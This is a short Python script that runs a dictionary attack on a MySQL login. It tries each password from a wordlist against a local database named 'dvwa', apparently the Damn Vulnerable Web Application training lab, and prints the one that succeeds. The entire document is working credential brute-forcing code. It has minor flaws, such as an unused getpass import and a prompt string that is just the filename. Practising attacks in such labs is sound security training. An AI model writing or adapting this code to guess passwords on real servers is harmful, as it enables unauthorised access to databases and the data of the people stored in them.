import mysql.connector
import getpass

def login_to_mysql(username, password_list_file):
    """Attempts to log in to a MySQL database using the provided username and password list.

    Args:
        username (str): The MySQL username.
        password_list_file (str): The path to the text file containing the list of passwords.

    Returns:
        bool: True if the login was successful, False otherwise.
    """

    with open(password_list_file, 'r') as f:
        passwords = [line.strip() for line in f]

    for password in passwords:
        try:
            conn = mysql.connector.connect(
                host="localhost",
                user=username,
                password=password,
                database="dvwa"
            )
            cursor = conn.cursor()

            # Perform a test query to verify the connection
            cursor.execute("SELECT 1")

            print(f"Login successful with password: {password}")
            return True
        except mysql.connector.Error as err:
            print(f"Error: {err}")

    print("Password not found in the list.")
    return False

if __name__ == "__main__":
    username = input("Enter your MySQL username: ")
    password_list_file = input("passwords.txt")

    login_to_mysql(username, password_list_file)